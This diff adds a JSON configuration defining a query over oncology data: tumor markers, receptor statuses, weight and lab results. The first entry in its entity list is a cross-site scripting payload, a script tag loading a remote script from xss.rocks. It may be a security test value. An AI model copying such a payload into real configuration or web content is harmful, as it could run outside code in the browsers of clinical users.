@@ -1,0 +1,56 @@
+{
+  "id": "trend.onco.extended",
+  "items": [
+    [
+      {
+        "key": "trendableEntities",
+        "query": {
+          "from": [
+            "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
+            "generalTumorMarkerTestResult",
+            "prostateTumorMarkerTestResult",
+            "breastTumorMarkerTestResultCa153",
+            "breastTumorMarkerTestResultCa125",
+            "breastTumorMarkerTestResultCa2729",
+            "estrogenReceptorStatus",
+            "her2ReceptorStatus",
+            "progesteroneReceptorStatus",
+            "weight",
+            "labCreatinineResult",
+            "labHemoglobinResult",
+            "labPlateletsResult",
+            "labTotalBilirubinResult",
+            "labWbcResult",
+            "testosterone"
+          ],
+          "filter": {
+            "must": [
+              {
+                "attributes.status": {
+                  "neq": "registered"
+                }
+              },
+              {
+                "should": [
+                  { "attributes.trendKey": { "neq": null } },
+                  { "attributes.$components.trendKey": { "neq": null } }
+                ]
+              }
+            ]
+          },
+          "dedup": true,
+          "sort": [{ "date": "asc" }],
+          "show": [
+            "id",
+            "date",
+            "attributes.code",
+            "attributes.trendKey",
+            "attributes.referenceRange",
+            "attributes.valueQuantity",
+            "attributes.components"
+          ]
+        }
+      }
+    ]
+  ]
+}
